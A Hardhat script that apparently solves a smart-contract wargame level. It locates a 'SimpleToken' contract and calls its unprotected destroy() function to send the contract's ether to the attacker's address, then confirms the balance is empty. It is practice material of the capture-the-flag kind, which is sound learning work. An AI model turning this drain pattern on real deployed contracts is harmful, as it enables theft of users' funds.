const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, bal
    let [attacker] = await ethers.getSigners()
    // Find tokenaddress from etherscan. NOT the instance address
    let tokenAddress = "0xF2Af56e1f8aBbe904972BdEFA512992Cc9558688"
    let target = await ethers.getContractAt("SimpleToken", tokenAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    tx = await target.destroy(attacker.address)
    await tx.wait(1)

    // Check
    bal = await ethers.provider.getBalance(target.address)
    if (parseInt(bal.toString()) == 0) {
        console.log(`${symbols.success} Emptied contract!`)
    } else {
        console.log(`${symbols.error} Contract still has ${bal} wei...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
